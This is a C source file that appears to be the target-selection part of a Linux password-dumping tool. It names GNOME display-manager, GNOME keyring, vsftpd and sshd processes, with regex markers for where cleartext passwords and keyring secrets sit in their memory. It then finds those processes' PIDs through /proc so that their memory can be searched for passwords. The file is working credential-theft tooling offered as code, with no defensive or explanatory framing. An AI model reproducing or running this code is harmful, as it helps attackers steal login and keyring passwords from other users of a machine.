#include <stdlib.h>
#include <string.h>
#include <fnmatch.h>
#include <errno.h>
#include <stdio.h>

#include "targets.h"
#include "dbg.h"

void initTargets(Target targets[MAX_TARGETS])
{
    //GNOME GDM
    strncpy(targets[0].name, "gdm-password", MAX_SHRT_NAME);
    strncpy(targets[0].source, "[SYSTEM - GNOME]", MAX_SHRT_NAME);
    targets[0].pids.size = 0;
    targets[0].needles.size = 2;
    targets[0].needles.needles[0] = "^_pammodutil_getpwnam_root_1$";
    targets[0].needles.needles[1] = "^gkr_system_authtok$";

    //GNOME Keyring
    strncpy(targets[1].name, "gnome-keyring-daemon", MAX_SHRT_NAME);
    strncpy(targets[1].source, "[SYSTEM - GNOME]", MAX_SHRT_NAME);
    targets[1].pids.size = 0;
    targets[1].needles.size = 2;
    targets[1].needles.needles[0] = "^+libgck\\-1.so\\.0$";
    targets[1].needles.needles[1] = "libgcrypt\\.so\\..+$";

    //VSFTPD
    strncpy(targets[2].name, "vsftpd", MAX_SHRT_NAME);
    strncpy(targets[2].source, "[SYSTEM - VSFTPD]", MAX_SHRT_NAME);
    targets[2].pids.size = 0;
    targets[2].needles.size = 1;
    targets[2].needles.needles[0] = "^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$";

    //SSHD
    strncpy(targets[3].name, "sshd:", MAX_SHRT_NAME);
    strncpy(targets[3].source, "[SYSTEM - SSH]", MAX_SHRT_NAME);
    targets[3].pids.size = 0;
    targets[3].needles.size = 1;
    targets[3].needles.needles[0] = "^sudo.+";
}

void getTargetPids(Target targets[MAX_TARGETS])
{
    DIR *dirp;
    struct dirent *dp;
    int pidSize;
    char fileName[MAX_CMDLINE_F] = {0};
    char buf[MAX_CMDLINE] = {0};
    FILE *fp = NULL;
    int i = -1;
    
    // Open process Dir
    if ((dirp = opendir("/proc")) == 0)
    {
        printf("[!!] /proc Access Denied!\n");
        exit(EXIT_FAILURE);
    }

    // Iterate through all processes
    while ((dp = readdir(dirp)) != NULL)
    {
        //If not a pid, skip
        if (fnmatch("[0-9]*", dp->d_name, 0) != 0)
            continue;

        // Get process name
        snprintf(fileName, MAX_CMDLINE_F-1, "/proc/%s/cmdline", dp->d_name);
        fp = fopen(fileName, "r");
        if (fp == NULL)
        {
            printf("Could not read /proc/%s/cmdline", dp->d_name);
            exit(EXIT_FAILURE);
        }       
        fgets(buf, MAX_CMDLINE-1, fp);

        //Compare cmdline to target names (fuzzy search)
        for (i =0; i < MAX_TARGETS; i++)
        {
            if (strstr(buf, targets[i].name) != NULL)
            {
                pidSize = targets[i].pids.size++; //update pids size
                targets[i].pids.array[pidSize] = atoi(dp->d_name); // update pids for target
                break;
            }
        }
    }

    closedir(dirp);
    return;
}

#ifdef DEBUG
void dumpTargets(Target *targets)
{
    int i = -1, j = -1;

    for (i = 0; i < MAX_TARGETS; i++)
    {
        if (targets[i].pids.size > 0) // pids found
        {
            log_info("FOUND TARGET PROCESS!\n");
            log_info("Name: %s", targets[i].name);
            log_info("Source: %s", targets[i].source);
            log_info("Needles:\n");
            for (j =0; j <targets[i].needles.size; j++)
            {
                log_info("Needle: %s\n", targets[i].needles.needles[j]);
  
            }
            log_info("PIDS:\n");
            for (j =0; j <targets[i].pids.size; j++)
            {
                log_info("PID: %d\n", targets[i].pids.array[j]);
            }
            // For each target process found, process its memory for passwords
        }
    }
}
#endif


